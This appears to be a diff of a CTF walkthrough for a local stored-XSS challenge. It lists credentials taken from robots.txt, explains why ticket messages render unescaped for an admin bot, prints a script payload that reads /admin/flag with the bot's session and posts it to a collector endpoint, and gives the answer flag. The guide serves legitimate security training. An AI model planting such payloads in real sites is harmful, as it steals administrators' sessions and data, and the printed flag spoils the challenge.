@@ -1,32 +1,69 @@
-# web-02-ticket-to-the-vault — Walkthrough
+# Ticket to the Vault: Short Walkthrough (Stored XSS)
 
-## Goal
-Use **stored XSS** to steal the flag from the admin, then read it in your captures.
+> Educational CTF guide. Target is local: `http://localhost:5002`.
 
-## Steps
-1. **Open the site**
-   - Go to the web page for this challenge.
+## Objective
 
-2. **Find login details**
-   - Open:
-     - `/robots.txt`
-   - Copy Tokyo’s login (it is written there).
+Get the flag by leveraging **Stored XSS** so the **Professor-bot** (admin) executes your script and you collect the flag in **/my-captures**.
 
-3. **Login**
-   - Login as Tokyo.
+---
 
-4. **Send a “ticket” with a script**
-   - Create a new ticket/message.
-   - Put this in the message (stored XSS):
-     - It fetches `/admin/flag`
-     - Then posts it to `/collector` for your user
+## 1) Open the App
 
-5. **Wait**
-   - The admin bot visits the admin page every few seconds.
-   - Your script runs in the admin’s browser.
+* Visit: **targetIP:port**
+* Click **Enter the Network**
 
-6. **Read the captured flag**
-   - Open:
-     - `/my-captures`
-   - The flag will be shown there.
+---
 
+## 2) Get Credentials (robots.txt)
+
+* Visit: **/robots.txt**
+* Use Tokyo creds:
+
+  * **tokyo / rio123**
+
+Login and confirm you see the dashboard.
+
+---
+
+## 3) What’s Vulnerable (High Level)
+
+* Messages are rendered **unescaped** on the admin page (stored XSS).
+* The **Professor-bot** visits `/admin/tickets` every ~8 seconds.
+* Your script runs with the bot’s **admin session**, so it can access `/admin/flag`.
+
+---
+
+## 4) Send the Exploit Message (Main Payload)
+
+Go to **Send Message** and paste:
+
+```html
+<script>
+fetch('/admin/flag')
+  .then(r => r.text())
+  .then(flag => {
+    fetch('/collector', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ user_id: 1, data: flag })
+    });
+  });
+</script>
+```
+
+Notes:
+
+* This assumes **Tokyo is user_id: 1**.
+
+---
+
+## 5) Wait, Then Retrieve
+
+* Wait **10–15 seconds**
+* Open **Intercepted Data** or go to: **/my-captures**
+* You should see the captured flag:
+
+  * `FLAG{THE_BOT_DID_THE_DIRTY_WORK}`
+
+---
